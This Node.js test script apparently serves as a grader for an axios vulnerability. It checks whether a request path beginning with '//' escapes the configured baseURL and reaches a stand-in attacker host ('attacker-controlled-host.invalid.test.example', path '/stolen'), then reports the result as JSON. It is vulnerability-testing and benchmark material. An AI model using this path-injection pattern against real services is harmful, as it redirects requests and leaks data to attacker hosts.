'use strict';

function emit(result) {
  console.log('ORACLE_RESULT ' + JSON.stringify(result));
}

async function main() {
  let axios;
  try {
    axios = require('axios');
    axios = axios.default || axios;
  } catch (e) {
    emit({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'module resolution failed: ' + (e && e.message)
    });
    return;
  }

  const GOOD_PORT = 65501; // assumed closed on loopback -> ECONNREFUSED
  const BAD_HOST = 'attacker-controlled-host.invalid.test.example'; // will not resolve -> ENOTFOUND/EAI_AGAIN
  const BAD_PORT = 65599;

  const baseURL = 'http://127.0.0.1:' + GOOD_PORT;

  function describeError(e) {
    if (!e) return '';
    const parts = [];
    if (e.message) parts.push(e.message);
    if (e.code) parts.push('code=' + e.code);
    if (e.hostname) parts.push('hostname=' + e.hostname);
    if (e.address) parts.push('address=' + e.address);
    if (e.port) parts.push('port=' + e.port);
    return parts.join(' | ');
  }

  // --- Benign operation first ---
  // A normal relative path against baseURL must result in a genuine network
  // attempt against the configured host (127.0.0.1:GOOD_PORT), proving the
  // real axios request pipeline runs end to end. Since nothing listens on
  // GOOD_PORT, we expect ECONNREFUSED referencing that port/address.
  const benignInstance = axios.create({ baseURL, timeout: 3000 });

  let benignErr = null;
  let benignResolved = false;
  try {
    await benignInstance.get('/some/normal/path');
    benignResolved = true;
  } catch (e) {
    benignErr = e;
  }

  const benignDesc = describeError(benignErr);

  const benignLooksLikeRealAttempt =
    benignResolved ||
    (
      !!benignErr &&
      (
        benignErr.code === 'ECONNREFUSED' ||
        benignErr.code === 'ETIMEDOUT' ||
        benignErr.code === 'ECONNRESET' ||
        benignErr.address === '127.0.0.1' ||
        (typeof benignErr.message === 'string' && benignErr.message.indexOf(String(GOOD_PORT)) !== -1)
      )
    );

  if (!benignLooksLikeRealAttempt) {
    emit({
      operation_completed: false,
      exploit_succeeded: false,
      evidence: 'benign operation did not behave as a normal network attempt against configured host: ' + benignDesc
    });
    return;
  }

  const operation_completed = true;

  // --- Malicious operation ---
  // Simulate the advisory scenario: a request path built from user input
  // happens to start with "//", producing a protocol-relative URL fragment
  // pointing at an attacker-controlled hostname. In the vulnerable version,
  // isAbsoluteURL + the http adapter's URL construction treat this as an
  // absolute protocol-relative URL and the underlying request targets
  // BAD_HOST:BAD_PORT, completely bypassing baseURL. Because BAD_HOST is an
  // unresolvable hostname, a genuine attempt to contact it surfaces as a DNS
  // resolution failure (ENOTFOUND/EAI_AGAIN) referencing BAD_HOST - a
  // distinct, unambiguous signature from the benign ECONNREFUSED against
  // 127.0.0.1. In the patched version the request either throws before any
  // connection attempt or stays scoped to the configured baseURL host, so
  // the attacker hostname never appears as the DNS lookup target.
  const maliciousInstance = axios.create({ baseURL, timeout: 3000 });

  const userId = '/' + BAD_HOST + ':' + BAD_PORT + '/stolen';
  const requestPath = '/' + userId; // => '//attacker-controlled-host.invalid.test.example:65599/stolen'

  let maliciousErr = null;
  let maliciousResolved = false;
  try {
    await maliciousInstance.get(requestPath);
    maliciousResolved = true;
  } catch (e) {
    maliciousErr = e;
  }

  if (maliciousResolved) {
    emit({
      operation_completed,
      exploit_succeeded: false,
      evidence: 'malicious request unexpectedly resolved without a network-level error; unable to confirm attacker-host targeting'
    });
    return;
  }

  const maliciousDesc = describeError(maliciousErr);

  const attemptedAttackerHost =
    !!maliciousErr &&
    (
      maliciousErr.hostname === BAD_HOST ||
      (typeof maliciousErr.message === 'string' && maliciousErr.message.indexOf(BAD_HOST) !== -1 &&
        (maliciousErr.code === 'ENOTFOUND' || maliciousErr.code === 'EAI_AGAIN' || maliciousErr.code === 'ECONNREFUSED' || maliciousErr.code === 'ETIMEDOUT'))
    );

  const stayedScopedToGoodHost =
    !!maliciousErr &&
    (
      maliciousErr.address === '127.0.0.1' ||
      (typeof maliciousErr.message === 'string' && maliciousErr.message.indexOf(String(GOOD_PORT)) !== -1 &&
        maliciousErr.message.indexOf(BAD_HOST) === -1)
    );

  let exploit_succeeded = false;
  let evidence;

  if (attemptedAttackerHost && !stayedScopedToGoodHost) {
    exploit_succeeded = true;
    evidence = 'malicious protocol-relative path "' + requestPath + '" caused axios to attempt a network request targeting attacker-controlled host "' + BAD_HOST + '" instead of staying scoped to baseURL "' + baseURL + '": ' + maliciousDesc;
  } else if (stayedScopedToGoodHost) {
    exploit_succeeded = false;
    evidence = 'malicious protocol-relative path did not escape baseURL scope; request stayed targeted at configured host: ' + maliciousDesc;
  } else {
    exploit_succeeded = false;
    evidence = 'malicious request did not target attacker-controlled host; observed error: ' + maliciousDesc;
  }

  emit({
    operation_completed,
    exploit_succeeded,
    evidence
  });
}

main().catch((e) => {
  emit({
    operation_completed: false,
    exploit_succeeded: false,
    evidence: 'unhandled exception: ' + (e && e.message)
  });
});
